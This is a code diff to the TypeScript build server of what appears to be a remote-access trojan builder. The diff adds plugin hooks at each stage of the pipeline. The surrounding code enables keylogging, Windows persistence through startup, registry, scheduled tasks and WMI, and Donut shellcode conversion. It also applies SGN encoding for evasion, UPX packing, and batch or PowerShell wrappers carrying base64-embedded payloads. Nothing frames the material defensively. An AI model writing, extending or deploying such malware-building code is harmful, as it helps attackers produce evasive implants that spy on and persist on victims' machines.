@@ -122,8 +122,110 @@ type BuildProcessConfig = {
   iosBundleId?: string;
   fetchPublicIP?: boolean;
   uploadToFileShare?: boolean;
+  buildPlugins?: Record<string, { enabled: boolean; settings: Record<string, unknown> }>;
 };
 
+type BuildHookRunner = (
+  hook: string,
+  payload: unknown,
+) => Promise<Array<{ pluginId: string; result: unknown }>>;
+
+type BuildHookMessage = {
+  text: string;
+  level?: "debug" | "info" | "warn" | "error" | "success";
+};
+
+function cloneForHook<T>(value: T): T {
+  return JSON.parse(JSON.stringify(value ?? null));
+}
+
+function isRecord(value: unknown): value is Record<string, any> {
+  return !!value && typeof value === "object" && !Array.isArray(value);
+}
+
+function normalizeHookMessages(result: unknown): BuildHookMessage[] {
+  if (!isRecord(result)) return [];
+  const rawMessages = Array.isArray(result.messages)
+    ? result.messages
+    : typeof result.message === "string"
+      ? [result.message]
+      : [];
+  const messages: BuildHookMessage[] = [];
+  for (const raw of rawMessages) {
+    if (typeof raw === "string" && raw.trim()) {
+      messages.push({ text: raw.trim(), level: "info" });
+    } else if (isRecord(raw) && typeof raw.text === "string" && raw.text.trim()) {
+      const level = typeof raw.level === "string" ? raw.level : "info";
+      messages.push({
+        text: raw.text.trim(),
+        level: ["debug", "info", "warn", "error", "success"].includes(level) ? level as BuildHookMessage["level"] : "info",
+      });
+    }
+  }
+  return messages;
+}
+
+async function runBuildHooks(
+  hookRunner: BuildHookRunner | undefined,
+  hook: string,
+  payload: unknown,
+  sendToStream: (data: any) => void,
+): Promise<Array<{ pluginId: string; result: unknown }>> {
+  if (!hookRunner) return [];
+  const results = await hookRunner(hook, cloneForHook(payload));
+  for (const item of results) {
+    for (const message of normalizeHookMessages(item.result)) {
+      sendToStream({
+        type: "output",
+        text: `[plugin:${item.pluginId}] ${message.text}\n`,
+        level: message.level || "info",
+      });
+    }
+  }
+  return results;
+}
+
+function mergeBuildConfigPatch(config: BuildProcessConfig, result: unknown): BuildProcessConfig {
+  if (!isRecord(result)) return config;
+  const patch = isRecord(result.config) ? result.config : isRecord(result.configPatch) ? result.configPatch : undefined;
+  if (!patch) return config;
+  return { ...config, ...patch };
+}
+
+function buildTransformHookPayload(args: {
+  buildId: string;
+  stage: string;
+  platform: string;
+  os: string;
+  arch: string;
+  targetKey: string;
+  outDir: string;
+  clientDir: string;
+  filename: string;
+  filePath: string;
+  size?: number;
+  config: BuildProcessConfig;
+  extra?: Record<string, unknown>;
+}) {
+  return {
+    buildId: args.buildId,
+    stage: args.stage,
+    platform: args.platform,
+    os: args.os,
+    arch: args.arch,
+    targetKey: args.targetKey,
+    outDir: args.outDir,
+    clientDir: args.clientDir,
+    file: {
+      filename: args.filename,
+      path: args.filePath,
+      platform: args.platform,
+      size: args.size ?? (fs.existsSync(args.filePath) ? fs.statSync(args.filePath).size : 0),
+    },
+    config: args.config,
+    ...(args.extra || {}),
+  };
+}
 
 function stripUpxHeaders(filePath: string): boolean {
   try {
@@ -154,6 +256,7 @@ type BuildProcessDeps = {
   generateBuildMutex: (length?: number) => string;
   sanitizeOutputName: (name: string) => string;
   fileShareRoot?: string;
+  runBuildHookForAll?: BuildHookRunner;
 };
 
 function guessMimeTypeForUpload(filename: string): string {
@@ -384,6 +487,15 @@ export async function startBuildProcess(
   }, BUILD_STREAM_HEARTBEAT_MS);
 
   try {
+    for (const item of await runBuildHooks(
+      deps.runBuildHookForAll,
+      "prepare",
+      { buildId, config },
+      sendToStream,
+    )) {
+      config = mergeBuildConfigPatch(config, item.result);
+    }
+
     const serverConfig = getConfig();
     const buildAgentToken = (serverConfig.auth.agentToken || "").trim();
 
@@ -809,10 +921,10 @@ func runBoundFiles() {
       const namePrefix = config.outputName || "agent";
       const winExt = config.outputExtension || ".exe";
       const buildSlug = buildId.substring(0, 8);
-      const friendlyOutputName = deps.sanitizeOutputName(
+      let friendlyOutputName = deps.sanitizeOutputName(
         platform.includes("windows") ? `${namePrefix}-${platform}${winExt}` : `${namePrefix}-${platform}`,
       );
-      const outputName = deps.sanitizeOutputName(
+      let outputName = deps.sanitizeOutputName(
         platform.includes("windows") ? `${namePrefix}-${platform}-${buildSlug}${winExt}` : `${namePrefix}-${platform}-${buildSlug}`,
       );
 
@@ -1084,7 +1196,7 @@ func runBoundFiles() {
         }
 
         // Base tags: always present regardless of build pass
-        const baseTags: string[] = [];
+        let baseTags: string[] = [];
         if (config.noPrinting) baseTags.push("noprint");
         if (config.disableKeylogger) baseTags.push("nokeylogger");
         if (config.enableWebrtc) baseTags.push("overlord_webrtc");
@@ -1095,13 +1207,80 @@ func runBoundFiles() {
         if (config.fetchPublicIP) baseTags.push("fetch_public_ip");
 
         // Windows persistence tags (omitted in shellcode mode — handled by two-pass below)
-        const winPersistTags: string[] = [];
+        let winPersistTags: string[] = [];
         if (config.enablePersistence && os === "windows" && !isShellcodeMode) {
           const methods = config.persistenceMethods?.length ? config.persistenceMethods : ["startup"];
           if (methods.includes("startup")) winPersistTags.push("persist_startup");
           if (methods.includes("registry")) winPersistTags.push("persist_registry");
           if (methods.includes("taskscheduler")) winPersistTags.push("persist_taskscheduler");
           if (methods.includes("wmi")) winPersistTags.push("persist_wmi");
+        }
+
+        let skipTarget = false;
+        const targetHookPayload = {
+          buildId,
+          platform,
+          os,
+          arch: actualArch,
+          effectiveOs,
+          targetKey,
+          outputName,
+          friendlyOutputName,
+          outputPath: path.join(outDir, outputName),
+          outDir,
+          clientDir,
+          env,
+          ldflags,
+          tags: [...baseTags, ...winPersistTags],
+          baseTags,
+          persistenceTags: winPersistTags,
+          garbleFlags,
+          config,
+        };
+        for (const item of await runBuildHooks(deps.runBuildHookForAll, "target", targetHookPayload, sendToStream)) {
+          if (!isRecord(item.result)) continue;
+          if (item.result.skip === true) {
+            skipTarget = true;
+          }
+          if (isRecord(item.result.env)) {
+            for (const [key, value] of Object.entries(item.result.env)) {
+              if (/^[A-Za-z_][A-Za-z0-9_]*$/.test(key) && value !== null && value !== undefined) {
+                env[key] = String(value);
+              }
+            }
+          }
+          if (typeof item.result.ldflags === "string") {
+            ldflags = item.result.ldflags;
+          }
+          if (typeof item.result.ldflagsAppend === "string" && item.result.ldflagsAppend.trim()) {
+            ldflags = ldflags ? `${ldflags} ${item.result.ldflagsAppend.trim()}` : item.result.ldflagsAppend.trim();
+          }
+          if (Array.isArray(item.result.removeTags)) {
+            const remove = new Set(item.result.removeTags.filter((tag: unknown) => typeof tag === "string"));
+            baseTags = baseTags.filter((tag) => !remove.has(tag));
+            winPersistTags = winPersistTags.filter((tag) => !remove.has(tag));
+          }
+          if (Array.isArray(item.result.tags)) {
+            baseTags = item.result.tags.filter((tag: unknown) => typeof tag === "string" && tag.trim()).map((tag: string) => tag.trim());
+            winPersistTags = [];
+          }
+          if (Array.isArray(item.result.addTags)) {
+            for (const tag of item.result.addTags) {
+              if (typeof tag === "string" && tag.trim() && !baseTags.includes(tag.trim())) {
+                baseTags.push(tag.trim());
+              }
+            }
+          }
+          if (typeof item.result.outputName === "string" && item.result.outputName.trim()) {
+            outputName = deps.sanitizeOutputName(item.result.outputName.trim());
+          }
+          if (typeof item.result.friendlyOutputName === "string" && item.result.friendlyOutputName.trim()) {
+            friendlyOutputName = deps.sanitizeOutputName(item.result.friendlyOutputName.trim());
+          }
+        }
+        if (skipTarget) {
+          sendToStream({ type: "output", text: `Skipping ${platform}; requested by server plugin hook.\n`, level: "warn" });
+          continue;
         }
 
         const runBuild = async (tags: string[], outputPath: string) => {
@@ -1159,12 +1338,51 @@ func runBoundFiles() {
 
         const filePath = `${outDir}/${outputName}`;
         let finalSize = Bun.file(filePath).size;
+        await runBuildHooks(
+          deps.runBuildHookForAll,
+          "post_build",
+          buildTransformHookPayload({
+            buildId,
+            stage: "post_build",
+            platform,
+            os,
+            arch: actualArch,
+            targetKey,
+            outDir,
+            clientDir,
+            filename: outputName,
+            filePath,
+            size: finalSize,
+            config,
+          }),
+          sendToStream,
+        );
         // For script outputs: go build writes a PE binary; UPX must run first (it needs PE format),
         // then after compression we wrap it in a script with an embedded base64 payload.
         const isBatchWrapper = os === "windows" && (winExt === ".bat" || winExt === ".cmd");
         const isPowerShellWrapper = os === "windows" && winExt === ".ps1";
 
         if (upxBin) {
+          await runBuildHooks(
+            deps.runBuildHookForAll,
+            "before_upx",
+            buildTransformHookPayload({
+              buildId,
+              stage: "before_upx",
+              platform,
+              os,
+              arch: actualArch,
+              targetKey,
+              outDir,
+              clientDir,
+              filename: outputName,
+              filePath,
+              size: finalSize,
+              config,
+              extra: { upxBin },
+            }),
+            sendToStream,
+          );
           sendToStream({ type: "output", text: `Compressing ${outputName} with UPX...\n`, level: "info" });
           const originalSize = finalSize;
           try {
@@ -1190,9 +1408,49 @@ func runBoundFiles() {
           } catch (upxErr: any) {
             sendToStream({ type: "output", text: `WARNING: UPX failed: ${upxErr.message || upxErr}\n`, level: "warn" });
           }
+          await runBuildHooks(
+            deps.runBuildHookForAll,
+            "after_upx",
+            buildTransformHookPayload({
+              buildId,
+              stage: "after_upx",
+              platform,
+              os,
+              arch: actualArch,
+              targetKey,
+              outDir,
+              clientDir,
+              filename: outputName,
+              filePath,
+              size: finalSize,
+              config,
+              extra: { upxBin, originalSize },
+            }),
+            sendToStream,
+          );
         }
 
         if (isBatchWrapper || isPowerShellWrapper) {
+          await runBuildHooks(
+            deps.runBuildHookForAll,
+            "before_script_wrapper",
+            buildTransformHookPayload({
+              buildId,
+              stage: "before_script_wrapper",
+              platform,
+              os,
+              arch: actualArch,
+              targetKey,
+              outDir,
+              clientDir,
+              filename: outputName,
+              filePath,
+              size: finalSize,
+              config,
+              extra: { extension: winExt },
+            }),
+            sendToStream,
+          );
           sendToStream({ type: "output", text: `Wrapping PE binary as ${winExt} script...\n`, level: "info" });
           try {
             const exeBytes = fs.readFileSync(filePath);
@@ -1252,10 +1510,49 @@ func runBoundFiles() {
           } catch (wrapErr: any) {
             sendToStream({ type: "output", text: `WARNING: Failed to generate ${winExt} wrapper: ${wrapErr.message || wrapErr}. Output is a raw PE binary with ${winExt} extension.\n`, level: "warn" });
           }
+          await runBuildHooks(
+            deps.runBuildHookForAll,
+            "after_script_wrapper",
+            buildTransformHookPayload({
+              buildId,
+              stage: "after_script_wrapper",
+              platform,
+              os,
+              arch: actualArch,
+              targetKey,
+              outDir,
+              clientDir,
+              filename: outputName,
+              filePath,
+              size: finalSize,
+              config,
+              extra: { extension: winExt },
+            }),
+            sendToStream,
+          );
         }
 
         // ── IPA packaging for iOS targets ──────────────────────────────────────
         if (os === "ios") {
+          await runBuildHooks(
+            deps.runBuildHookForAll,
+            "before_ipa",
+            buildTransformHookPayload({
+              buildId,
+              stage: "before_ipa",
+              platform,
+              os,
+              arch: actualArch,
+              targetKey,
+              outDir,
+              clientDir,
+              filename: outputName,
+              filePath,
+              size: finalSize,
+              config,
+            }),
+            sendToStream,
+          );
           sendToStream({ type: "output", text: `Packaging ${outputName} as IPA...\n`, level: "info" });
           try {
             const appName = config.outputName || "Agent";
@@ -1355,6 +1652,27 @@ func runBoundFiles() {
               // Clean up temp dirs
               fs.rmSync(ipaWorkDir, { recursive: true, force: true });
 
+              await runBuildHooks(
+                deps.runBuildHookForAll,
+                "after_ipa",
+                buildTransformHookPayload({
+                  buildId,
+                  stage: "after_ipa",
+                  platform,
+                  os,
+                  arch: actualArch,
+                  targetKey,
+                  outDir,
+                  clientDir,
+                  filename: ipaOutputName,
+                  filePath: ipaPath,
+                  size: finalSize,
+                  config,
+                  extra: { inputFilename: outputName },
+                }),
+                sendToStream,
+              );
+
               // Push IPA file entry instead of raw binary
               (build.files as any[]).push({
                 name: ipaOutputName.replace(`-${buildSlug}`, ""),
@@ -1387,6 +1705,26 @@ func runBoundFiles() {
           const scOutputName = deps.sanitizeOutputName(outputName.replace(/\.[^.]+$/, ".bin"));
           const binPath = path.join(outDir, scOutputName);
           const donutArch = (actualArch === "386" ? "386" : "amd64") as "386" | "amd64";
+          await runBuildHooks(
+            deps.runBuildHookForAll,
+            "before_donut",
+            buildTransformHookPayload({
+              buildId,
+              stage: "before_donut",
+              platform,
+              os,
+              arch: actualArch,
+              targetKey,
+              outDir,
+              clientDir,
+              filename: finalOutputName,
+              filePath,
+              size: finalOutputSize,
+              config,
+              extra: { outputFilename: scOutputName, outputPath: binPath, donutArch },
+            }),
+            sendToStream,
+          );
           const ok = await runDonut(filePath, binPath, donutArch, sendToStream);
           if (!ok) throw new Error(`Donut shellcode conversion failed for ${platform}`);
           try { fs.unlinkSync(filePath); } catch {}
@@ -1394,6 +1732,26 @@ func runBoundFiles() {
           finalOutputSize = Bun.file(binPath).size;
           shellcodeBinPath = binPath;
           shellcodeArch = donutArch;
+          await runBuildHooks(
+            deps.runBuildHookForAll,
+            "after_donut",
+            buildTransformHookPayload({
+              buildId,
+              stage: "after_donut",
+              platform,
+              os,
+              arch: actualArch,
+              targetKey,
+              outDir,
+              clientDir,
+              filename: finalOutputName,
+              filePath: binPath,
+              size: finalOutputSize,
+              config,
+              extra: { inputFilename: outputName, donutArch },
+            }),
+            sendToStream,
+          );
           sendToStream({ type: "output", text: `Shellcode ready: ${finalOutputSize} bytes → ${finalOutputName}\n`, level: "success" });
         }
 
@@ -1403,6 +1761,26 @@ func runBoundFiles() {
           sendToStream({ type: "output", text: `\nWrapping ELF with Linux shellcode stub...\n`, level: "info" });
           const scOutputName = deps.sanitizeOutputName(outputName + ".bin");
           const binPath = path.join(outDir, scOutputName);
+          await runBuildHooks(
+            deps.runBuildHookForAll,
+            "before_linux_shellcode",
+            buildTransformHookPayload({
+              buildId,
+              stage: "before_linux_shellcode",
+              platform,
+              os,
+              arch: actualArch,
+              targetKey,
+              outDir,
+              clientDir,
+              filename: finalOutputName,
+              filePath,
+              size: finalOutputSize,
+              config,
+              extra: { outputFilename: scOutputName, outputPath: binPath },
+            }),
+            sendToStream,
+          );
           const ok = buildLinuxShellcode(filePath, binPath, sendToStream);
           if (!ok) throw new Error(`Linux shellcode wrap failed for ${platform}`);
           try { fs.unlinkSync(filePath); } catch {}
@@ -1410,6 +1788,26 @@ func runBoundFiles() {
           finalOutputSize = Bun.file(binPath).size;
           shellcodeBinPath = binPath;
           shellcodeArch = "amd64";
+          await runBuildHooks(
+            deps.runBuildHookForAll,
+            "after_linux_shellcode",
+            buildTransformHookPayload({
+              buildId,
+              stage: "after_linux_shellcode",
+              platform,
+              os,
+              arch: actualArch,
+              targetKey,
+              outDir,
+              clientDir,
+              filename: finalOutputName,
+              filePath: binPath,
+              size: finalOutputSize,
+              config,
+              extra: { inputFilename: outputName },
+            }),
+            sendToStream,
+          );
           sendToStream({ type: "output", text: `Shellcode ready: ${finalOutputSize} bytes → ${finalOutputName}\n`, level: "success" });
         }
 
@@ -1419,24 +1817,169 @@ func runBoundFiles() {
           sendToStream({ type: "output", text: `\nEncoding shellcode with SGN (${iters} iteration${iters === 1 ? "" : "s"})...\n`, level: "info" });
           const sgnOutputName = deps.sanitizeOutputName(finalOutputName + ".sgn");
           const sgnOutputPath = path.join(outDir, sgnOutputName);
+          await runBuildHooks(
+            deps.runBuildHookForAll,
+            "before_sgn",
+            buildTransformHookPayload({
+              buildId,
+              stage: "before_sgn",
+              platform,
+              os,
+              arch: actualArch,
+              targetKey,
+              outDir,
+              clientDir,
+              filename: finalOutputName,
+              filePath: shellcodeBinPath,
+              size: finalOutputSize,
+              config,
+              extra: { outputFilename: sgnOutputName, outputPath: sgnOutputPath, shellcodeArch, iterations: iters },
+            }),
+            sendToStream,
+          );
           const ok = await runSgn(shellcodeBinPath, sgnOutputPath, shellcodeArch, iters, sendToStream);
           if (!ok) throw new Error(`SGN encoding failed for ${platform}`);
           try { fs.unlinkSync(shellcodeBinPath); } catch {}
           finalOutputName = sgnOutputName;
           finalOutputSize = Bun.file(sgnOutputPath).size;
           shellcodeBinPath = sgnOutputPath;
+          await runBuildHooks(
+            deps.runBuildHookForAll,
+            "after_sgn",
+            buildTransformHookPayload({
+              buildId,
+              stage: "after_sgn",
+              platform,
+              os,
+              arch: actualArch,
+              targetKey,
+              outDir,
+              clientDir,
+              filename: finalOutputName,
+              filePath: sgnOutputPath,
+              size: finalOutputSize,
+              config,
+              extra: { shellcodeArch, iterations: iters },
+            }),
+            sendToStream,
+          );
           sendToStream({ type: "output", text: `SGN-encoded shellcode: ${finalOutputSize} bytes → ${finalOutputName}\n`, level: "success" });
 
           if (config.outputSgnTxt) {
             sendToStream({ type: "status", text: `Writing ${platform} SGN output as TXT…` });
             const txtOutputName = deps.sanitizeOutputName(`${finalOutputName}.txt`);
             const txtOutputPath = path.join(outDir, txtOutputName);
+            await runBuildHooks(
+              deps.runBuildHookForAll,
+              "before_sgn_txt",
+              buildTransformHookPayload({
+                buildId,
+                stage: "before_sgn_txt",
+                platform,
+                os,
+                arch: actualArch,
+                targetKey,
+                outDir,
+                clientDir,
+                filename: finalOutputName,
+                filePath: sgnOutputPath,
+                size: finalOutputSize,
+                config,
+                extra: { outputFilename: txtOutputName, outputPath: txtOutputPath, shellcodeArch, iterations: iters },
+              }),
+              sendToStream,
+            );
             const txtSize = writeSgnTextArtifact(sgnOutputPath, txtOutputPath, platform, shellcodeArch, iters);
             try { fs.unlinkSync(sgnOutputPath); } catch {}
             finalOutputName = txtOutputName;
             finalOutputSize = txtSize;
             shellcodeBinPath = txtOutputPath;
+            await runBuildHooks(
+              deps.runBuildHookForAll,
+              "after_sgn_txt",
+              buildTransformHookPayload({
+                buildId,
+                stage: "after_sgn_txt",
+                platform,
+                os,
+                arch: actualArch,
+                targetKey,
+                outDir,
+                clientDir,
+                filename: finalOutputName,
+                filePath: txtOutputPath,
+                size: finalOutputSize,
+                config,
+                extra: { shellcodeArch, iterations: iters },
+              }),
+              sendToStream,
+            );
             sendToStream({ type: "output", text: `SGN TXT ready: ${txtSize} bytes → ${finalOutputName}\n`, level: "success" });
+          }
+        }
+
+        const extraArtifactFiles: any[] = [];
+        const artifactHookPayload = {
+          buildId,
+          platform,
+          os,
+          arch: actualArch,
+          targetKey,
+          outDir,
+          clientDir,
+          file: {
+            name: finalOutputName.replace(`-${buildSlug}`, ""),
+            filename: finalOutputName,
+            path: path.join(outDir, finalOutputName),
+            platform,
+            version: agentVersion,
+            size: finalOutputSize,
+          },
+          files: cloneForHook(build.files),
+          config,
+        };
+        for (const item of await runBuildHooks(deps.runBuildHookForAll, "artifact", artifactHookPayload, sendToStream)) {
+          if (!isRecord(item.result)) continue;
+          const replacement = isRecord(item.result.file) ? item.result.file : item.result;
+          if (typeof replacement.filename === "string" && replacement.filename.trim()) {
+            const safeFilename = deps.sanitizeOutputName(path.basename(replacement.filename.trim()));
+            const candidatePath = resolveContainedPath(outDir, safeFilename);
+            if (fs.existsSync(candidatePath)) {
+              finalOutputName = safeFilename;
+              finalOutputSize = fs.statSync(candidatePath).size;
+            } else {
+              sendToStream({
+                type: "output",
+                text: `[plugin:${item.pluginId}] WARNING: artifact hook returned missing file ${safeFilename}; keeping ${finalOutputName}\n`,
+                level: "warn",
+              });
+            }
+          }
+          if (typeof replacement.size === "number" && Number.isFinite(replacement.size) && replacement.size >= 0) {
+            finalOutputSize = Math.floor(replacement.size);
+          }
+          if (Array.isArray(item.result.files)) {
+            for (const f of item.result.files) {
+              if (!isRecord(f) || typeof f.filename !== "string" || !f.filename.trim()) continue;
+              const safeFilename = deps.sanitizeOutputName(path.basename(f.filename.trim()));
+              const candidatePath = resolveContainedPath(outDir, safeFilename);
+              if (!fs.existsSync(candidatePath)) {
+                sendToStream({
+                  type: "output",
+                  text: `[plugin:${item.pluginId}] WARNING: extra artifact not found: ${safeFilename}\n`,
+                  level: "warn",
+                });
+                continue;
+              }
+              const stat = fs.statSync(candidatePath);
+              extraArtifactFiles.push({
+                name: typeof f.name === "string" && f.name.trim() ? f.name.trim() : safeFilename,
+                filename: safeFilename,
+                platform: typeof f.platform === "string" ? f.platform : platform,
+                version: typeof f.version === "string" ? f.version : agentVersion,
+                size: stat.size,
+              });
+            }
           }
         }
 
@@ -1447,6 +1990,7 @@ func runBoundFiles() {
           version: agentVersion,
           size: finalOutputSize,
         });
+        (build.files as any[]).push(...extraArtifactFiles);
       } catch (err: any) {
         const errorMsg = `[ERROR] Failed to build ${platform}: ${err.message || err}\n`;
         logger.error(`[build:${buildId.substring(0, 8)}] ${errorMsg.trim()}`);
@@ -1483,6 +2027,21 @@ func runBoundFiles() {
       });
     }
 
+    await runBuildHooks(
+      deps.runBuildHookForAll,
+      "complete",
+      {
+        buildId,
+        status: build.status,
+        files: build.files,
+        outputDir: outDir,
+        expiresAt: build.expiresAt,
+        userId: config.builtByUserId,
+        config,
+      },
+      sendToStream,
+    );
+
     sendToStream({ type: "complete", success: true, files: build.files, buildId, expiresAt: build.expiresAt });
 
     saveBuild({
@@ -1502,6 +2061,23 @@ func runBoundFiles() {
   } catch (err: any) {
     build.status = "failed";
     logger.error(`[build:${buildId.substring(0, 8)}] Build failed:`, err);
+    try {
+      await runBuildHooks(
+        deps.runBuildHookForAll,
+        "failed",
+        {
+          buildId,
+          status: build.status,
+          error: err?.message || String(err),
+          files: build.files,
+          userId: config.builtByUserId,
+          config,
+        },
+        sendToStream,
+      );
+    } catch (hookErr) {
+      logger.warn(`[build:${buildId.substring(0, 8)}] failed hook error:`, hookErr);
+    }
     sendToStream({ type: "error", error: err.message || String(err) });
     sendToStream({ type: "complete", success: false, buildId });
 
